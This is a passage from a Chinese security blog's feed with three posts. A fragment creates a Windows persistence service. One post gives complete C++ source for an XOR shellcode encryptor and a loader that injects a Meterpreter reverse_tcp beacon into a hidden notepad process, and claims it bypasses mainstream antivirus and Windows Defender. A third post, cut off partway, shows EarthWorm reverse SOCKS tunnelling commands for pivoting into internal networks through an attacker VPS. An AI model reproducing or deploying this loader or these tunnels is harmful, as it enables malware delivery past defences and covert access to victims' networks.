id="2-使用Powershell"><a href="#2-使用Powershell" class="headerlink" title="2.使用Powershell"></a>2.使用Powershell</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">New-Service</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;pentestlab&quot;</span> <span class="hljs-literal">-BinaryPathName</span> <span class="hljs-string">&quot;C:\temp\pentestlab.exe&quot;</span> <span class="hljs-literal">-Description</span> <span class="hljs-string">&quot;PentestLaboratories&quot;</span> <span class="hljs-literal">-StartupType</span> Automatic<br><span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> pentestlab<br></code></pre></td></tr></table></figure><p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/13.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1.前言&quot;&gt;&lt;/a&gt;1.前言&lt;/h1&gt;&lt;p&gt;后门（backdoor），在信息安全领域通常是指绕过安全措施获取对程序或系统访问权限的方法。攻击者往往在提升权之后，会通过建</summary>
      
    
    
    
    <category term="内网安全" scheme="https://reader-l.github.io/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>简单加密+分离+进程注入绕过杀软</title>
    <link href="https://reader-l.github.io/2021/04/11/%E7%AE%80%E5%8D%95%E5%8A%A0%E5%AF%86-%E5%88%86%E7%A6%BB-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/"/>
    <id>https://reader-l.github.io/2021/04/11/%E7%AE%80%E5%8D%95%E5%8A%A0%E5%AF%86-%E5%88%86%E7%A6%BB-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/</id>
    <published>2021-04-11T03:55:35.000Z</published>
    <updated>2021-04-26T03:04:23.025Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>​    这篇文章涉及到分离配合加密免杀的原理：就是将<code>shellcode</code>进行加密的同时和<code>shellcode</code>加载器进行分离，但这里需要注意的是这里的<code>shellcode</code>是指完整的<code>beacon</code>，而不是<code>stager</code>，我们是需要对完整的<code>beacon</code>进行加密。</p><p>​    比如用MSF生成的<code>reverse_tcp</code>这一类型的<code>payload</code>的<code>shellcode</code>。我们需要用的是这个payload：<code>windows/x64/meterpreter_reverse_tcp</code>（这种是完整的beacon）并对其进行加密，而不是<code>windows/x64/meterpreter/reverse_tcp</code>（这一种生成的是<code>stager</code>，在目标服务器执行的时候，它会向攻击者的msf服务请求完整的<code>beacon</code>再完成反弹。）对这payload的生成的<code>shellcode</code>进行加密，其实你只是加密了<code>stager</code>而不是<code>beacon</code>，所以你的<code>beacon</code>还是明文的，容易被查杀。</p><h1 id="2-使用到的windows-api"><a href="#2-使用到的windows-api" class="headerlink" title="2.使用到的windows api"></a>2.使用到的windows api</h1><h2 id="1-分离基础"><a href="#1-分离基础" class="headerlink" title="1.分离基础"></a>1.分离基础</h2><h3 id="1-CreateFile"><a href="#1-CreateFile" class="headerlink" title="1.CreateFile"></a>1.CreateFile</h3><p>该方法用于打开文件，我是利用它打开MSF生成的文件<code>beacon</code>。</p><p><img src="/2021/04/11/%E7%AE%80%E5%8D%95%E5%8A%A0%E5%AF%86-%E5%88%86%E7%A6%BB-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/1.png"></p><h3 id="2-GetFileSize"><a href="#2-GetFileSize" class="headerlink" title="2.GetFileSize"></a>2.GetFileSize</h3><p>获取字节文件的大小。</p><p><img src="/2021/04/11/%E7%AE%80%E5%8D%95%E5%8A%A0%E5%AF%86-%E5%88%86%E7%A6%BB-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/2.png"></p><h3 id="3-ReadFile"><a href="#3-ReadFile" class="headerlink" title="3.ReadFile"></a>3.ReadFile</h3><p><img src="/2021/04/11/%E7%AE%80%E5%8D%95%E5%8A%A0%E5%AF%86-%E5%88%86%E7%A6%BB-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/3.png"></p><h2 id="2-进程注入基础"><a href="#2-进程注入基础" class="headerlink" title="2.进程注入基础"></a>2.进程注入基础</h2><h3 id="1-进程创建"><a href="#1-进程创建" class="headerlink" title="1.进程创建"></a>1.进程创建</h3><h4 id="1-CreateProcessA"><a href="#1-CreateProcessA" class="headerlink" title="1.CreateProcessA"></a>1.CreateProcessA</h4><p><img src="/2021/04/11/%E7%AE%80%E5%8D%95%E5%8A%A0%E5%AF%86-%E5%88%86%E7%A6%BB-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/4.png"></p><h3 id="2-进程注入"><a href="#2-进程注入" class="headerlink" title="2.进程注入"></a>2.进程注入</h3><h4 id="1-WriteProcessMemory"><a href="#1-WriteProcessMemory" class="headerlink" title="1.WriteProcessMemory"></a>1.WriteProcessMemory</h4><p><img src="/2021/04/11/%E7%AE%80%E5%8D%95%E5%8A%A0%E5%AF%86-%E5%88%86%E7%A6%BB-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/5.png"></p><h4 id="2-CreateRemoteThread"><a href="#2-CreateRemoteThread" class="headerlink" title="2.CreateRemoteThread"></a>2.CreateRemoteThread</h4><p><img src="/2021/04/11/%E7%AE%80%E5%8D%95%E5%8A%A0%E5%AF%86-%E5%88%86%E7%A6%BB-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/6.png"></p><h1 id="3-完整代码"><a href="#3-完整代码" class="headerlink" title="3.完整代码"></a>3.完整代码</h1><h3 id="恶意程序"><a href="#恶意程序" class="headerlink" title="恶意程序"></a>恶意程序</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tchar.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">StreamCrypt</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>* Data, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> Length, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> Key)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Help</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc)</span></span>;<br><br><span class="hljs-keyword">int</span> _tmain(<span class="hljs-keyword">int</span> argc,_TCHAR* argv[])<br>&#123;<br><span class="hljs-keyword">if</span> (Help(argc) == <span class="hljs-literal">false</span>) &#123;<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-comment">//key</span><br><span class="hljs-keyword">int</span> key = <span class="hljs-number">100000</span>;<br><span class="hljs-comment">//获取shellcode</span><br>DWORD dwread = <span class="hljs-number">0</span>;<br>HANDLE  hFile = CreateFile(argv[<span class="hljs-number">1</span>], GENERIC_ALL, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><br><br>DWORD shellcode_size = GetFileSize(hFile, <span class="hljs-literal">NULL</span>);<br>LPVOID shellcode = VirtualAlloc(<span class="hljs-literal">NULL</span>, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>ReadFile(hFile, shellcode, shellcode_size, &amp;dwread, <span class="hljs-literal">NULL</span>);<br><br>StreamCrypt((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *)shellcode, shellcode_size, key); <span class="hljs-comment">// decode</span><br><span class="hljs-comment">// Create a 64-bit process: </span><br>STARTUPINFOA si;<br>PROCESS_INFORMATION pi;<br>LPVOID allocation_start;<br>SIZE_T allocation_size = (SIZE_T)shellcode_size;<br>HANDLE hProcess, hThread;<br><br><br>ZeroMemory(&amp;si, <span class="hljs-keyword">sizeof</span>(si));<br>ZeroMemory(&amp;pi, <span class="hljs-keyword">sizeof</span>(pi));<br><br><br>si.cb = <span class="hljs-keyword">sizeof</span>(si);<br>si.dwFlags = STARTF_USESHOWWINDOW;<br>si.wShowWindow = SW_HIDE;<br><br><br>CreateProcessA(<span class="hljs-string">&quot;C:\\windows\\system32\\notepad.exe&quot;</span>,<span class="hljs-literal">NULL</span> , <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, FALSE,<br>CREATE_NO_WINDOW, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi);<br><br><span class="hljs-comment">//Execute the process</span><br>allocation_start = VirtualAllocEx(pi.hProcess, <span class="hljs-literal">NULL</span>, allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>WriteProcessMemory(pi.hProcess, allocation_start,shellcode, allocation_size, <span class="hljs-literal">NULL</span>);<br>CreateRemoteThread(pi.hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)allocation_start, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">StreamCrypt</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>* Data, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> Length, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> key)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//简单异或 </span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> i = <span class="hljs-number">0</span>; i &lt; Length; i++) &#123;<br>Data[i] ^= key;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Help</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc)</span> </span>&#123;<br><span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Powered by reader-l\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Blog:http://reader-l.github.io\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;usage:ProcessTest.exe EncodeRAWData\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="shellcode加密程序代码"><a href="#shellcode加密程序代码" class="headerlink" title="shellcode加密程序代码"></a>shellcode加密程序代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tchar.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">StreamCrypt</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>* Data, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> Length, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> Key)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Help</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc)</span></span>;<br><br><span class="hljs-keyword">int</span> _tmain(<span class="hljs-keyword">int</span> argc,_TCHAR* argv[]) &#123;<br><span class="hljs-comment">//</span><br><span class="hljs-keyword">if</span> (Help(argc) == <span class="hljs-literal">false</span>) &#123;<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-comment">//变量定义</span><br>HANDLE hFile;<br>HANDLE hFileNew;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> key = <span class="hljs-number">100000</span>;<br>DWORD shellcode_size = <span class="hljs-number">0</span>;<br>DWORD dwRead;<br>DWORD dwWrite;<br>PVOID pshellcode;<br>PVOID pEnCodeShellCode;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>* buf;<br><br><span class="hljs-comment">//读取完整的beacon</span><br>hFile = CreateFile(argv[<span class="hljs-number">1</span>] , GENERIC_ALL, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-comment">//获取文件大小</span><br>shellcode_size = GetFileSize(hFile, <span class="hljs-literal">NULL</span>);<br><br>pshellcode = VirtualAlloc(<span class="hljs-literal">NULL</span>, shellcode_size, MEM_COMMIT, PAGE_READWRITE);<br><br>ReadFile(hFile,pshellcode,shellcode_size,&amp;dwRead,<span class="hljs-number">0</span>);<br>CloseHandle(hFile);<br>buf = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>*)pshellcode;<br><br>StreamCrypt((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *)buf, shellcode_size, key);<br>hFileNew = CreateFile(<span class="hljs-string">L&quot;EncodeRAWData&quot;</span>, GENERIC_ALL, FILE_SHARE_READ, <span class="hljs-literal">NULL</span>, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span class="hljs-literal">NULL</span>);<br><br>pEnCodeShellCode = VirtualAlloc(<span class="hljs-literal">NULL</span>, shellcode_size, MEM_COMMIT, PAGE_READWRITE);<br><br><span class="hljs-built_in">memcpy</span>((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *)pEnCodeShellCode, buf, shellcode_size);<br><br>WriteFile(hFileNew, pEnCodeShellCode, shellcode_size, &amp;dwWrite, <span class="hljs-literal">NULL</span>);<br><br>CloseHandle(hFileNew);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">StreamCrypt</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>* Data, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> Length, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> key)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//简单异或 </span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> i = <span class="hljs-number">0</span>; i &lt; Length; i++) &#123;<br>Data[i] ^= key;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Help</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc)</span> </span>&#123;<br><span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Powered by reader-l\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Blog:http://reader-l.github.io\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;usage:XorEncode.exe beacon.bin\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="4-查杀效果"><a href="#4-查杀效果" class="headerlink" title="4.查杀效果"></a>4.查杀效果</h1><p>国内主流的安全防护软件都可以过掉。<code>windows defender</code>的防护只会发出一个警告，二次执行的时候<code>windows defender</code>就不会有反应了。</p><h1 id="5-编译程序存放的github地址"><a href="#5-编译程序存放的github地址" class="headerlink" title="5.编译程序存放的github地址"></a>5.编译程序存放的github地址</h1><p><a href="https://github.com/ReadER-L/BypassSecuritySoftware">https://github.com/ReadER-L/BypassSecuritySoftware</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1.前言&quot;&gt;&lt;/a&gt;1.前言&lt;/h1&gt;&lt;p&gt;​    这篇文章涉及到分离配合加密免杀的原理：就是将&lt;code&gt;shellcode&lt;/code&gt;进行加密的同时和&lt;code</summary>
      
    
    
    
    <category term="免杀" scheme="https://reader-l.github.io/categories/%E5%85%8D%E6%9D%80/"/>
    
    
  </entry>
  
  <entry>
    <title>内网安全学习四-SOCKS代理</title>
    <link href="https://reader-l.github.io/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/"/>
    <id>https://reader-l.github.io/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/</id>
    <published>2021-04-05T11:59:49.000Z</published>
    <updated>2021-04-06T13:31:10.546Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-SOCKS代理简介"><a href="#1-SOCKS代理简介" class="headerlink" title="1.SOCKS代理简介"></a>1.SOCKS代理简介</h1><p>​    SOCKS是一种代理服务，可以简单的将系统的一端连接到另一端。</p><p>​    常见的SOCKS支持的协议：包括HTTP、FTP等。SOCKS分为SOCKS4和SOCKS5两种类型：其中SOCKS4只支持TCP协议；SOCKS5不仅支持TCP/UDP协议，还支持各种身份验证机制等，其标准的端口为1080。SOCKS能够目标内网计算机进行通信，避免多次使用端口转发。</p><p>SOCKS代理常见的应用场景有如下三类：</p><p>1.服务器在内网中，可以任意访问外部网络。</p><p>2.服务器在内网中，可以访问外部网络，但是服务器安装了防火墙来拒绝敏感端口的连接。</p><p>3.服务器在内网中，对外只开放了部分端口（例如80端口），且服务器不能访问外部网络 。</p><h1 id="2-常见的SOCKS代理工具"><a href="#2-常见的SOCKS代理工具" class="headerlink" title="2.常见的SOCKS代理工具"></a>2.常见的SOCKS代理工具</h1><h2 id="1-EarthWorm"><a href="#1-EarthWorm" class="headerlink" title="1.EarthWorm"></a>1.EarthWorm</h2><p>​    EW是一套便携式网络工具，具有SOCKS5服务架设和端口转发两大核心功能。能够以正向、反向、多级级联等方式建立网络隧道。EW工具包提供了多个可执行文件，适用于不同的操作系统。</p><p>下载链接：<a href="https://github.com/rootkiter/EarthWorm">https://github.com/rootkiter/EarthWorm</a>       <a href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p><p>​    EW共有六种命令格式，分别是ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran。其中用于普通的网路环境的正向命令是ssocksd，用于反弹连接的命令是rcsocks、rssocks，其他命令用于复杂网络环境的多级级联。</p><h2 id="2-使用方式"><a href="#2-使用方式" class="headerlink" title="2.使用方式"></a>2.使用方式</h2><h3 id="1-正向SOCKS-5服务器"><a href="#1-正向SOCKS-5服务器" class="headerlink" title="1.正向SOCKS 5服务器"></a>1.正向SOCKS 5服务器</h3><p>以下命令适用于目标机器拥有一个外网IP地址的情况：</p><p>将ew对应操作系统的可执行文件上传到目标机器上并执行如下命令，即可在目标上架设一个端口888的SOCKS代理了，接下来在攻击者的机器上用SocksCap64（For win）或者proxychains（For Linux）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">ew</span> <span class="hljs-selector-tag">-s</span> <span class="hljs-selector-tag">ssocksd</span> <span class="hljs-selector-tag">-l</span> 888<br><br><span class="hljs-selector-tag">proxychains</span> <span class="hljs-selector-tag">ping</span> <span class="hljs-selector-tag">iz9jlx</span><span class="hljs-selector-class">.dnslog</span><span class="hljs-selector-class">.cn</span><br></code></pre></td></tr></table></figure><p><img src="/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/1.png"></p><h3 id="2-反弹SOCKS-5服务器"><a href="#2-反弹SOCKS-5服务器" class="headerlink" title="2.反弹SOCKS 5服务器"></a>2.反弹SOCKS 5服务器</h3><p>当目标机器没有公网IP地址的时候可以利用该方法，使得我们可以访问内网资源。</p><p>假设实验环境如下：</p><p>1.VPS的公网IP是（Linux）：172.16.56.1</p><p>2.目标web服务器（win7）：公网IP—&gt;172.16.56.135    内网IP—-&gt;172.16.55.135。</p><p>3.内网的另一台机器（win2008）：内网IP—&gt;172.16.55.141。</p><p>实验目标：让VPS能够访问内网IP为172.16.55.141的机器。</p><h4 id="实验步骤："><a href="#实验步骤：" class="headerlink" title="实验步骤："></a>实验步骤：</h4><p>1.首先将EW上传到攻击者的VPS上，然后执行如下命令：该命令的意思是在公网VPS上添加一个转接隧道，把1080端口收到的代理请求转发888端口。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">./ew_for_linux</span> <span class="hljs-string">-s</span> <span class="hljs-string">rcsocks</span> <span class="hljs-string">-l</span> <span class="hljs-number">1080</span> <span class="hljs-string">-e</span> <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure><p><img src="/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/2.png"></p><p>2.将EW上传到有公网IP和内网IP的windows7 的web服务器上，并执行如下命令：该命令的意思实在该机器上启动SOCKS 5 服务，然后反弹到公网VPS的4444端口上。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s rssocks -d 公网VPS的IP -e <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure><p>3.可以看到反弹成功了，现在就可以通过访问公网VPS机器的1080端口，使用假设在内网WIN7上的SOCKS 5的代理服务了。</p><p><img src="/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/3.png"></p><h3 id="3-二级网络环境（内网有主机拥有公网IP）"><a href="#3-二级网络环境（内网有主机拥有公网IP）" class="headerlink" title="3.二级网络环境（内网有主机拥有公网IP）"></a>3.二级网络环境（内网有主机拥有公网IP）</h3><p>​    假设现在获取了内网环境中两台主机（分别为A主机和B主机）的权限，A主机配有两张网卡，一块能够连接外网，另一块只能连接内网中的一台主机（B主机），但无法访问内网中的其他资源。B主机可以访问内网的任何资源，但是无法访问外网。</p><p>A主机：有公网IP—–&gt;172.16.56.135，内网IP——&gt;172.16.55.135，只能访问B主机，不能访问其他资源。</p><p>B主机：有内网IP—–&gt;172.16.55.141 可以访问内网中任何资源，但是不能访问外网。</p><p>实验目标：在B主机上搭建SOCKS代理服务，让攻击者可以访问内网中的任意资源。</p><h4 id="实验步骤：-1"><a href="#实验步骤：-1" class="headerlink" title="实验步骤："></a>实验步骤：</h4><p>1.首先将EW上传到B主机上，利用ssocksd方式启动888端口的SOCKS代理，命令如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s ssocksd -l <span class="hljs-number">888</span><br></code></pre></td></tr></table></figure><p>2.然后将EW上传到A主机中，执行如下命令：该命令的意思是将A主机的1080端口受到的代理请求转发给B主机（172.16.55.141）的888端口。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s lcx_tran -l <span class="hljs-number">1080</span> -f B主机的内网IP -g <span class="hljs-number">888</span><br></code></pre></td></tr></table></figure><p>现在就可以通过访问A主机（公网IP）的1080端口使用在B主机上架设的SOCKS 5代理了。</p><h3 id="4-二级网络环境（内网中不存在拥有公网IP的主机）"><a href="#4-二级网络环境（内网中不存在拥有公网IP的主机）" class="headerlink" title="4.二级网络环境（内网中不存在拥有公网IP的主机）"></a>4.二级网络环境（内网中不存在拥有公网IP的主机）</h3><p>​    假设现在获取了内网环境中两台主机（分别为A主机和B主机）的权限，A主机配有一张内网网卡，但无法访问内网中的其他资源。B主机可以访问内网的任何资源，但是无法访问外网。</p><p>VPS主机：<code>49.*.*.234</code></p><p>A主机：内网IP——&gt;172.16.55.135，不能访问内网其他资源，但是能够访问外网。</p><p>B主机：有内网IP—–&gt;172.16.55.141 可以访问内网中任何资源，但是不能访问外网。</p><p>实验目标：在B主机上搭建SOCKS代理服务，让攻击者可以访问内网中的任意资源。</p><h4 id="实验步骤：-2"><a href="#实验步骤：-2" class="headerlink" title="实验步骤："></a>实验步骤：</h4><p>1.首先将EW上传到我们的VPS主机上，执行如下命令：该命令的意思是在公网VPS上添加一条转接隧道，将13443端口收到的代理请求转发给6666端口。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s lcx_listen -l <span class="hljs-number">13443</span> -e <span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure><p><img 